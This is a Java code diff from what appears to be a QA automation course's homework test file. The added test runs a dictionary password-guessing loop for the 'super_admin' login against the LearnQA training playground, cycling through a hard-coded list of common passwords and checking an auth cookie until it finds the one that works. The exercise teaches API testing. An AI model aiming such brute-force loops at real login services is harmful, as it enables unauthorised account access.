@@ -134,15 +134,101 @@ public class homeworkTests {
         }
     }
 
+    //Ex9: Подбор пароля
     @Test
-    public void testGetToken1()
+    public void testPostMapBody()
     {
-        JsonPath responseForStatus = RestAssured
-                .given()
-                .queryParam("token", "AMzozMxoDOxAyMx0CNw0CNyAjM")
-                .get("https://playground.learnqa.ru/ajax/api/longtime_job")
-                .jsonPath();
-        responseForStatus.prettyPrint();
+        String[] password =
+                {"password",
+                "123456",
+                "123456789",
+                "12345678",
+                "12345",
+                "qwerty",
+                "abc123",
+                "football",
+                "1234567",
+                "monkey",
+                "111111",
+                "letmein",
+                "1234",
+                "1234567890",
+                "dragon",
+                "baseball",
+                "sunshine",
+                "iloveyou",
+                "trustno1",
+                "princess",
+                "adobe123",
+                "123123",
+                "welcome",
+                "login",
+                "admin",
+                "qwerty123",
+                "solo",
+                "1q2w3e4r",
+                "master",
+                "666666",
+                "photoshop",
+                "1qaz2wsx",
+                "qwertyuiop",
+                "ashley",
+                "mustang",
+                "121212",
+                "starwars",
+                "654321",
+                "bailey",
+                "access",
+                "flower",
+                "555555",
+                "passw0rd",
+                "shadow",
+                "lovely",
+                "7777777",
+                "michael",
+                "!@#$%^&*",
+                "jesus",
+                "password1",
+                "superman",
+                "hello",
+                "charlie",
+                "888888",
+                "696969",
+                "hottie",
+                "freedom",
+                "aa123456",
+                "qazwsx",
+                "ninja",
+                "azerty",
+                "loveme",
+                "whatever",
+                "donald",
+                "batman",
+                "zaq1zaq1",
+                "Football",
+                "0",
+                "123qwe"};
+
+        String response = "";
+        int i = 0;
+        while (!Objects.equals(response, "You are authorized")){
+            Response responseForCookie = RestAssured
+                    .given()
+                    .body("{\"login\":\"super_admin\",\"password\":\"" + password[i] + "\"}")
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String responseCookieAuth = responseForCookie.getCookie("auth_cookie");
+
+            Response responseCheckCookie = RestAssured
+                    .given()
+                    .cookies("auth_cookie",responseCookieAuth)
+                    .get("https://playground.learnqa.ru/api/check_auth_cookie")
+                    .andReturn();
+            response = responseCheckCookie.print();
+            i++;
+        }
+        System.out.println("Correct password is: " + password[i-1]);
     }
 
     public void statusCorrect(String status, String expectedStatus)
